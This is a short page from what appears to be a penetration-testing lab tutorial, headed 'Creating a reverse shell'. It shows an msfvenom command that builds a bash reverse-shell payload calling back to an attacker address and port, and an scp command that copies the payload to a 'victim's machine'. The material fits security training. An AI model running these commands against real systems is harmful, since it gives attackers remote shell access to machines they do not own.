    <body><div class='page'><h1 class='title'>4.4 Creating a reverse shell</h1><br/><br />1. On your Kali Machine create a “bash” shell with msfvenom.<br />	<div class="codebox"><div class="codebox"><span style="color:#0057ae;font-weight:400">$msfvenom</span>&nbsp;-p&nbsp;cmd/unix/reverse_bash&nbsp;LHOST=192.168.12.10&nbsp;LPORT=1234&nbsp;-f&nbsp;raw&nbsp;&gt;&nbsp;shell.sh</div></div><br /><br />2. Copy the “shell.sh” file to your victim&#39;s machine.<br />	<div class="codebox"><div class="codebox"><span style="color:#0057ae;font-weight:400">$scp</span>&nbsp;shell.sh&nbsp;&nbsp;freddie@192.168.12.26:/tmp</div></div><br />	<br /><p align="center"><img src="images/home.svg" height="22" width="22">  <a href="index.html">Index</a></p></div></body></html>
